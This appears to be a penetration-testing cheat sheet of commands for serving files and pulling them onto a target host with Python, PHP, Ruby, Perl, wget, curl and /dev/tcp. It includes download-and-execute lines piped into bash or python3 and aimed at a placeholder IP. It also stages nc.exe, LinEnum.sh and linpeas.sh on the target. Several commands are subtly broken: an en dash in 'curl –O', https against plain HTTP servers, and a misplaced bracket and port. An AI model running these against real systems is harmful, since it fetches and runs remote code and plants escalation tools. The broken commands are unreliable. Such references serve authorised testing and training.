### **Setting Up an HTTP Server and Downloading a File Using Python 2**

1.  Start a http server:  
    `python -m SimpleHTTPServer 8000`
2.  Download file using python:  
    `python2 -c 'import urllib;urllib.urlretrieve ("http://[IP-ADRESS]:8000/file.txt", "file.txt")'`
3.  Download file using wget:  
    `wget http://[IP-ADRESS]:8000/file.txt`
4.  Download file using curl:  
    `curl –O https://[IP-ADRESS]:8000/file.txt`

### **Setting Up an HTTP Server and Downloading a File Using Python 3**

1.  Start a http server:  
    `python3 -m http.server 8000`
2.  Download file using python:  
    `python3 -c 'import urllib.request;urllib.request.urlretrieve("http://[IP-ADRESS:8000]/file.txt", "file.txt")'`
3.  Download file using wget  
    `wget http://[IP-ADRESS]:8000/file.txt`
4.  Download file using curl  
    `curl –O https://[IP-ADRESS]:8000/file.txt`

### **Setting Up an Apache Server and Downloading a File**

1.  Put files into the apache web directory:  
    `cp nc.exe /var/www/html`
2.  Start the apache server  
    `sudo systemctl start apache2`
3.  Download file using wget   
    `wget http://[IP-ADRESS]:8000/file.txt`
4.  Download file using curl   
    `curl –O https://[IP-ADRESS]:8000/file.txt`

### **Setting Up an HTTP Server and Downloading Files Using PHP**

1.  Start a http server:    
    `php -S 0.0.0.0:8000`
2.  Download a file using file_get_contents and file_put_contents:   
    `php -r '$file = file_get_contents("http://[IP-ADRESS]:8000/file.txt"); file_put_contents("file.txt",$file);'`
3.  Download a file using fopen:   
    `php -r 'const BUFFER = 1024; $fremote = fopen("http://[IP-ADRESS]:8000/file.txt", "rb"); $flocal = fopen("file.txt", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`
4.  Download and pipe to bash:    
    `php -r '$lines = @file("http://[IP-ADRESS]:8000/file.txt"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`
5.  Download file using wget :
    
    `wget http://[IP-ADRESS]:8000/file.txt`
6.  Download file using curl :  
    `curl –O https://[IP-ADRESS]:8000/file.txt`

### **Setting Up an HTTP Server and Downloading Files Using Ruby**

1.  Start an HTTP server:  
    `ruby -run -e httpd . -p 8000`
2.  Download file using Ruby:  
    `ruby -e 'require "net/http"; File.write("file.txt", Net::HTTP.get(URI.parse("http://[IP-ADDRESS]:8000")))'`
3.  Download file using wget:  
    `wget http://[IP-ADDRESS]:8000/file.txt`
4.  Download file using curl:  
    `curl -O https://[IP-ADDRESS]:8000/file.txt`


### **Fileless Downloads**

1.  Curl to bash: Download and execute script without saving.  
    `curl http://[IP-ADDRESS]:8000/script.sh | bash`
2.  Wget to Python: Download Python script and execute without saving.  
    `wget -qO- http://[IP-ADDRESS]:8000/script.py | python3`
3.  Download file using Perl:  
    `perl -e 'use LWP::Simple; getstore("http://[IP-ADDRESS]:8000/file.txt", "file.txt");'`

### **Bash (/dev/tcp) Downloads**

1.  Connect to the target webserver:  
    `exec 3<>/dev/tcp/[IP-ADDRESS]/80`
2.  Send HTTP GET request:  
    `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
3.  Print the response:  
    `cat <&3`


### **Base64 Encoding and Decoding**

1.  Encode file to Base64:  
    `cat file | base64 -w 0; echo`
2.  Decode Base64 to file:  
    `echo -n 'BASE64-STRING' | base64 -d > output_file`


### **SSH and SCP Operations**

1.  `scp -P 6498 linpeas.sh [USERNAME]@[IP-ADRESS]:/tmp`